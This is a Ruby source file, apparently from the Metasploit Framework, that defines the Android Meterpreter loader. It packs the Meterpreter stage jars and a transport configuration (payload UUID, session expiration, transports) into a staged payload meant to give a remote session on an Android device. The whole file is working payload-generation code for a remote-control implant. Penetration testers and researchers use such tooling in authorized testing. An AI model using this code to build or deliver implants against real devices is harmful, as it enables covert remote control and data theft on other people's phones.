# -*- coding: binary -*-

require 'msf/core'
require 'msf/base/sessions/meterpreter_options'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Common loader for Android payloads that make use of Meterpreter.
#
###

module Payload::Android::MeterpreterLoader

  include Msf::Payload::Android
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Android Meterpreter & Configuration',
      'Description'   => 'Android-specific meterpreter generation',
      'Author'        => ['OJ Reeves'],
      'Platform'      => 'android',
      'Arch'          => ARCH_DALVIK,
      'PayloadCompat' => {'Convention' => 'http https'},
      'Stage'         => {'Payload' => ''}
    ))
  end

  def stage_payload(opts={})
    stage_meterpreter(opts)
  end

  def stage_meterpreter(opts={})
    clazz = 'androidpayload.stage.Meterpreter'
    metstage = MetasploitPayloads.read("android", "metstage.jar")
    met = MetasploitPayloads.read("android", "meterpreter.jar")

    # Name of the class to load from the stage, the actual jar to load
    # it from, and then finally the meterpreter stage
    blocks = [
      java_string(clazz),
      java_string(metstage),
      java_string(met),
      java_string(generate_config(opts))
    ]

    (blocks + [blocks.length]).pack('A*' * blocks.length + 'N')
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid
    ds = opts[:datastore] || datastore

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      ascii_str:  true,
      arch:       opts[:uuid].arch,
      expiration: ds['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: opts[:transport_config] || [transport_config(opts)]
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the XML version of it
    config.to_b
  end
end
end

